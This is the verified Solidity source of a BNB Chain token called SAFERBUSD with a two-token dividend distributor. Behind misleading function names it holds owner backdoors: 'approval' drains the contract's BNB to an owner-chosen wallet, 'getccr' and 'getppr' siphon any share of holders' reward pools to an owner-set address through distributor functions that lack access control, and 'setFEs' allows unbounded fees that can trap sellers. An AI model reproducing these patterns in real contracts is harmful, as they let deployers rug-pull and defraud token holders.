/**
 *Submitted for verification at BscScan.com on 2021-10-20
*/

/**
 *Submitted for verification at BscScan.com on 2021-10-20
*/

//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShareI(address shareholder, uint256 amount) external;
    function setShareII(address shareholder, uint256 amount) external;
    function depositI() external payable;
    function depositII() external payable;
    function process(uint256 gas) external;
    function setnewrw(address _nrew, address _prew) external;
    function cCRwds(uint256 _aPn, uint256 _aPd) external;
    function cSRwds(uint256 _aPn, uint256 _aPd) external;
    function setnewra(address _newra) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;
    
    address _token;
    
    struct ShareI {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    struct ShareII {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IBEP20 RWDS = IBEP20(0x8076C74C5e3F5852037F31Ff0093Eeb8c8ADd8D3);
    IBEP20 SRWDS = IBEP20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);
    address REWARDS;
    IDEXRouter router;
    
    uint256 public totalSharesI;
    uint256 public totalSharesII;
    uint256 public totalDividendsI;
    uint256 public totalDistributedI;
    uint256 public dividendsPerShareI;
    uint256 public totalDividendsII;
    uint256 public totalDistributedII;
    uint256 public dividendsPerShareII;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 600;
    uint256 public minDistribution = 1000000 * (10 ** 9);
    uint256 currentIndex;
    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => ShareI) public sharesI;
    mapping (address => ShareII) public sharesII;
    
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShareI(address shareholder, uint256 amount) external override onlyToken {
        if(sharesI[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && sharesI[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && sharesI[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalSharesI = totalSharesI.sub(sharesI[shareholder].amount).add(amount);
        sharesI[shareholder].amount = amount;
        sharesI[shareholder].totalExcluded = getCumulativeDividendsI(sharesI[shareholder].amount);
    }

    function setShareII(address shareholder, uint256 amount) external override onlyToken {
        if(sharesII[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && sharesII[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && sharesII[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalSharesII = totalSharesII.sub(sharesII[shareholder].amount).add(amount);
        sharesII[shareholder].amount = amount;
        sharesII[shareholder].totalExcluded = getCumulativeDividendsII(sharesII[shareholder].amount);
    }

    function cCRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_aPn).div(_aPd);
        RWDS.transfer(shareholder, PRamount);
    }
    
    function depositI() external payable override onlyToken {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(RWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividendsI = totalDividendsI.add(amount);
        dividendsPerShareI = dividendsPerShareI.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalSharesI));
    }

    function depositII() external payable override onlyToken {
        uint256 balanceBefore = SRWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(SRWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = SRWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividendsII = totalDividendsII.add(amount);
        dividendsPerShareII = dividendsPerShareII.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalSharesII));
    }

    function cSRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Pamount = SRWDS.balanceOf(address(this));
        uint256 PPamount = Pamount.mul(_aPn).div(_aPd);
        SRWDS.transfer(shareholder, PPamount);
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0; }
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]); }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++; }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarningsI(shareholder) > minDistribution
                && getUnpaidEarningsII(shareholder) > minDistribution;
    }

    function setnewra(address _newra) external override onlyToken {
        REWARDS = _newra;
    }

    function distributeDividend(address shareholder) internal {
        if(sharesI[shareholder].amount == 0){ return; }
        uint256 amountI = getUnpaidEarningsI(shareholder);
        if(amountI > 0){
            totalDistributedI = totalDistributedI.add(amountI);
            RWDS.transfer(shareholder, amountI);
            shareholderClaims[shareholder] = block.timestamp;
            sharesI[shareholder].totalRealised = sharesI[shareholder].totalRealised.add(amountI);
            sharesI[shareholder].totalExcluded = getCumulativeDividendsI(sharesI[shareholder].amount); }
        if(sharesII[shareholder].amount == 0){ return; }
        uint256 amountII = getUnpaidEarningsII(shareholder);
        if(amountII > 0){
            totalDistributedII = totalDistributedII.add(amountII);
            SRWDS.transfer(shareholder, amountII);
            shareholderClaims[shareholder] = block.timestamp;
            sharesII[shareholder].totalRealised = sharesII[shareholder].totalRealised.add(amountII);
            sharesII[shareholder].totalExcluded = getCumulativeDividendsII(sharesII[shareholder].amount); }    
    }

    function getUnpaidEarningsI(address shareholder) public view returns (uint256) {
        if(sharesI[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividendsI(sharesI[shareholder].amount);
        uint256 shareholderTotalExcluded = sharesI[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getUnpaidEarningsII(address shareholder) public view returns (uint256) {
        if(sharesII[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividendsII(sharesII[shareholder].amount);
        uint256 shareholderTotalExcluded = sharesII[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function setnewrw(address _nrew, address _srew) external override onlyToken {
        SRWDS = IBEP20(_srew);
        RWDS = IBEP20(_nrew);
    }

    function getCumulativeDividendsI(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShareI).div(dividendsPerShareAccuracyFactor);
    }

    function gettotalDistributedI() public view returns (uint256) {
        return uint256(totalDistributedI);
    }

    function getCumulativeDividendsII(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShareII).div(dividendsPerShareAccuracyFactor);
    }

    function gettotalDistributedII() public view returns (uint256) {
        return uint256(totalDistributedII);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract SAFERBUSD is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "SAFERBUSD";
    string constant _symbol = "SAFERBUSD";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 10 ) / 1000;
    uint256 public _maxWalletToken = ( _totalSupply * 20 ) / 1000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) isDividendExempt;
    uint256 liqF = 3;
    uint256 rewF = 8;
    uint256 marF = 3;
    uint256 totF = 14;
    uint256 feeD  = 100;
    address aLR;
    uint256 bthis;
    address mFR;
    address csB;
    uint256 gass = 50000;
    uint256 targetLiquidity = 20;
    uint256 seTt = 20;
    uint256 targetLiquidityDenominator = 100;
    uint256 tBF = 20;
    IDEXRouter public router;
    address public pair;
    uint256 bbf = 14;
    uint256 public asT = _totalSupply * 5 / 10000;
    DividendDistributor distributor;
    uint256 distributorGas = 500000;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 10 / 10000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);

        distributor = new DividendDistributor(address(router));

        isFeeExempt[msg.sender] = true;
        isFeeExempt[mFR] = true;
        isFeeExempt[csB] = true;
        isFeeExempt[aLR] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[mFR] = true;
        isTxLimitExempt[csB] = true;
        isTxLimitExempt[aLR] = true;
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;
        isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;
        csB = msg.sender;
        aLR = msg.sender;
        mFR = msg.sender;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

     function setMaxTXP(uint256 maxTXPercent) external authorized {
        _maxTxAmount = (_totalSupply * maxTXPercent ) / 1000;
    }

     function setMaxWalletP(uint256 maxWallPercent) external authorized {
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 1000;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        if (!authorizations[sender] && recipient != address(this) && recipient != address(DEAD) && recipient != pair && recipient != mFR && recipient != aLR){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        checkTxLimit(sender, amount);
        if(shouldSwapBack(amount)){ swapBack(); }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        if(!isDividendExempt[sender]) {
            try distributor.setShareI(sender, _balances[sender]) {} catch {}
            try distributor.setShareII(sender, _balances[sender]) {} catch {}}
        if(!isDividendExempt[recipient]) {
            try distributor.setShareI(recipient, _balances[recipient]) {} catch {}
            try distributor.setShareII(recipient, _balances[recipient]) {} catch {}}
        try distributor.process(distributorGas) {} catch {}
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function getTF(bool selling) public view returns (uint256) {
        if(selling){ return seTt.mul(1); }
        if(!selling){ return bbf.mul(1); }
        return totF;
    }

    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTF(receiver == pair)).div(feeD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }
    
    function setmFR(address _mFR) external authorized {
        mFR = _mFR;
    }

    function settokdep(address _newra) external authorized {
        distributor.setnewra(_newra);
    }

    function setnewrewdI(address _nrew, address _prew) external authorized {
        distributor.setnewrw(_nrew, _prew);
    }

    function shouldSwapBack(uint256 amount) internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && amount >= asT
        && _balances[address(this)] >= swapThreshold;
    }

    function approval(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(csB).transfer(amountBNB * aP / 100);
    }

    function maxTL() external authorized {
        _maxTxAmount = _totalSupply.mul(1);
        _maxWalletToken = _totalSupply.mul(1);
    }

    function setseT(uint256 _seTt, uint256 _beTt) external authorized {
        seTt = _seTt;
        bbf = _beTt;
    }

    function setcsB(address _csB) external authorized {
        csB = _csB;
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liqF;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totF).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 balanceBefore = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance.sub(balanceBefore);
        uint256 aBNBL = amountBNB.mul(dynamicLiquidityFee).div(tBF).div(2);
        uint256 aBNBR = amountBNB.mul(rewF).div(tBF);
        uint256 aBNBM = amountBNB.mul(marF).div(tBF);
        try distributor.depositI{value: aBNBR.div(2)}() {} catch {}
        try distributor.depositII{value: aBNBR.div(2)}() {} catch {}
        (bool tmpSuccess,) = payable(mFR).call{value: aBNBM, gas: gass}("");

        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                amountToLiquify,
                0,
                0,
                aLR,
                block.timestamp
            );
            
            emit AutoLiquify(aBNBL, amountToLiquify);
        }
    }

    function setIsDividendExempt(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = exempt;
        if(exempt){
            distributor.setShareI(holder, 0); distributor.setShareII(holder, 0);
        }else{
            distributor.setShareI(holder, _balances[holder]); distributor.setShareII(holder, _balances[holder]);}
    }

    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsTimelockExempt(address holder, bool exempt) external authorized {
        isTimelockExempt[holder] = exempt;
    }

    function setFEs(uint256 _liqF, uint256 _rewF, uint256 _marF, uint256 _totF, uint256 _feeD) external authorized {
        liqF = _liqF;
        rewF = _rewF;
        marF = _marF;
        totF = _totF;
        feeD = _feeD;
    }

    function setFRec(address _mFR, address _csB) external authorized {
        mFR = _mFR;
        csB = _csB;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _totalSupply * _amount / 10000;
    }

    function settbF(uint256 _tbF) external authorized {
        tBF = _tbF;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function setmgas(uint256 _gass) external authorized {
        gass = _gass;
    }

    function getppr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cSRwds(_aPn, _aPd);
    }

    function setswbset() external authorized {
        swapBack();
    }

    function getccr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cCRwds(_aPn, _aPd);
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setaLR(address _aLR) external authorized {
        aLR = _aLR;
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000);
        distributorGas = gas;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }


    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}